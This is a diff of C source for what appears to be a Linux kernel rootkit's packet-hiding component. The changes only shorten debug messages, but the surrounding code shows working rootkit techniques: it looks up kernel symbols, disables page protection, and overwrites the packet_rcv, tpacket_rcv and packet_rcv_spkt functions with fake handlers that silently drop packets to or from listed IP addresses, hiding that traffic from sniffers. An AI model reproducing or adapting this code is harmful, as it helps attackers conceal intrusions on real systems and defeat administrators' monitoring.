@@ -103,7 +103,7 @@ int packet_check(struct sk_buff *skb) {
 		/* look for source and destination address */
 		if(find_packet_ipv4((u8 *)&header->saddr) || find_packet_ipv4((u8 *)&header->daddr)) {
 
-			debug("[ packet_check ] IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
+			debug("IPV4 SENDER %pI4 IN LIST", (u8 *)&header->saddr);
 
 			/* ip in list, should be hidden */
 			return 1;
@@ -119,7 +119,7 @@ int packet_check(struct sk_buff *skb) {
 		/* look for source and destination address */
 		if(find_packet_ipv6(header->saddr.s6_addr) || find_packet_ipv6(header->daddr.s6_addr)) {
 
-			debug("[ packet_check ] IPV6 SENDER %pI6 IN LIST", header->saddr.s6_addr);
+			debug("IPV6 SENDER %pI6 IN LIST", header->saddr.s6_addr);
 
 			/* ip in list, should be hidden */
 			return 1;
@@ -140,7 +140,7 @@ void packet_hide(char *protocol, char *ip) {
 		/* no errors, check for occurence in list */
 		if(!find_packet_ipv4(ipv4_addr)) {
 
-			debug("[ packet_hide ] INSERT IPV4 SENDER %pI4", ipv4_addr);
+			debug("INSERT IPV4 SENDER %pI4", ipv4_addr);
 
 			/* ipv4 address not in list, insert */
 			insert_data_node(&packets_ipv4, (void *)ipv4_addr);
@@ -154,7 +154,7 @@ void packet_hide(char *protocol, char *ip) {
 		/* no errors, check for occurence in list */
 		if(!find_packet_ipv6(ipv6_addr)) {
 
-			debug("[ packet_hide ] INSERT IPV4 SENDER %pI6", ipv6_addr);
+			debug("INSERT IPV4 SENDER %pI6", ipv6_addr);
 
 			/* ipv4 address not in list, insert */
 			insert_data_node(&packets_ipv6, (void *)ipv6_addr);
@@ -174,7 +174,7 @@ void packet_unhide(char *protocol, char *ip) {
 
 		if(node != NULL) {
 
-			debug("[ packet_unhide ] REMOVE IPV4 SENDER %pI4", ipv4_addr);
+			debug("REMOVE IPV4 SENDER %pI4", ipv4_addr);
 
 			/* free ip */
 			kfree(node->data);
@@ -193,7 +193,7 @@ void packet_unhide(char *protocol, char *ip) {
 
 		if(node != NULL) {
 
-			debug("[ packet_unhide ] REMOVE IPV6 SENDER %pI6", ipv4_addr);
+			debug("REMOVE IPV6 SENDER %pI6", ipv4_addr);
 
 			/* free ip */
 			kfree(node->data);
@@ -210,7 +210,7 @@ void hijack_packet_rcv(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] HIJACKING PACKET_RCV FUNCTION");
+	debug("HIJACKING PACKET_RCV FUNCTION");
 
 	/* update jump_pointer */
 	*jump_pointer = (unsigned long) fake_packet_rcv;
@@ -228,7 +228,7 @@ void reset_packet_rcv(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] RESETTING PACKET_RCV FUNCTION");
+	debug("RESETTING PACKET_RCV FUNCTION");
 
 	/* update jump_pointer */
 	memcpy(original_packet_rcv, original_packet_rcv_assembly, ASSEMBLY_LENGTH);
@@ -245,7 +245,7 @@ void hijack_tpacket_rcv(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] HIJACKING TPACKET_RCV FUNCTION");
+	debug("HIJACKING TPACKET_RCV FUNCTION");
 
 	/* update jump_pointer */
 	*jump_pointer = (unsigned long) fake_tpacket_rcv;
@@ -263,7 +263,7 @@ void reset_tpacket_rcv(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] RESETTING TPACKET_RCV FUNCTION");
+	debug("RESETTING TPACKET_RCV FUNCTION");
 
 	/* update jump_pointer */
 	memcpy(original_tpacket_rcv, original_tpacket_rcv_assembly, ASSEMBLY_LENGTH);
@@ -280,7 +280,7 @@ void hijack_packet_rcv_spkt(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] HIJACKING PACKET_RCV_SPKT FUNCTION");
+	debug("HIJACKING PACKET_RCV_SPKT FUNCTION");
 
 	/* update jump_pointer */
 	*jump_pointer = (unsigned long) fake_packet_rcv_spkt;
@@ -298,7 +298,7 @@ void reset_packet_rcv_spkt(void) {
 
 	disable_page_protection();
 
-	debug("[ hijack_packet_rcv ] RESETTING PACKET_RCV_SPKT FUNCTION");
+	debug("RESETTING PACKET_RCV_SPKT FUNCTION");
 
 	/* update jump_pointer */
 	memcpy(original_packet_rcv_spkt, original_packet_rcv_spkt_assembly, ASSEMBLY_LENGTH);
@@ -317,7 +317,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_t
 	/* Check if we need to hide packet */
 	if(packet_check(skb)) {
 
-		debug("[ fake_packet_rcv ] PACKET DROP");
+		debug("PACKET DROP");
 
 		dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
@@ -335,7 +335,7 @@ int fake_packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_t
 
 	dec_critical(&lock_packet_rcv, &accesses_packet_rcv);
 
-	debug("[ fake_packet_rcv ] PACKET ACCEPT");
+	debug("PACKET ACCEPT");
 
 	return ret;
 }
@@ -349,7 +349,7 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_
 
 	if(packet_check(skb)) {
 
-		debug("[ fake_tpacket_rcv ] PACKET DROP");
+		debug("PACKET DROP");
 
 		dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
@@ -367,7 +367,7 @@ int fake_tpacket_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_
 
 	dec_critical(&lock_tpacket_rcv, &accesses_tpacket_rcv);
 
-	debug("[ fake_tpacket_rcv ] PACKET ACCEPT");
+	debug("PACKET ACCEPT");
 
 	return ret;
 }
@@ -380,7 +380,7 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct pac
 
 	if(packet_check(skb)) {
 
-		debug("[ fake_packet_rcv_spkt ] PACKET DROP");
+		debug("PACKET DROP");
 
 		dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 
@@ -398,14 +398,14 @@ int fake_packet_rcv_spkt(struct sk_buff *skb, struct net_device *dev, struct pac
 
 	dec_critical(&lock_packet_rcv_spkt, &accesses_packet_rcv_spkt);
 
-	debug("[ fake_packet_rcv_spkt ] PACKET ACCEPT");
+	debug("PACKET ACCEPT");
 
 	return ret;
 }
 
 int packet_hiding_init(void) {
 
-	debug("[ packet_hiding_init ] INITIALIZE PACKET HIDING");
+	debug("INITIALIZE PACKET HIDING");
 
 	original_packet_rcv = (void *)kallsyms_lookup_name("packet_rcv");
 	original_tpacket_rcv = (void *)kallsyms_lookup_name("tpacket_rcv");
@@ -432,7 +432,7 @@ int packet_hiding_init(void) {
 
 void packet_hiding_exit(void) {
 
-	debug("[ packet_hiding_exit ] EXIT PACKET HIDING");
+	debug("EXIT PACKET HIDING");
 
 	/* reset every function */
 	reset_packet_rcv();
